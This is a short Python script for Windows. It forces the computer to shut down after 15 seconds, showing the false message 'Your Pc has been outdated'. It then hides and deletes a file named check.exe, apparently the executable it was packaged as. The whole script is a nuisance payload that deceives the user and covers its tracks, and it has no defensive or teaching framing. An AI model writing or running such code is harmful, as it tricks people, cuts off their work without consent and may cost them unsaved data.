import os


os.system('shutdown -s -c "Your Pc has been outdated" -t 15')

#os.remove("check.exe")

fn = 'check.exe'
p = os.popen('attrib +h ' + fn)
t = p.read()
p.close()

os.remove("check.exe")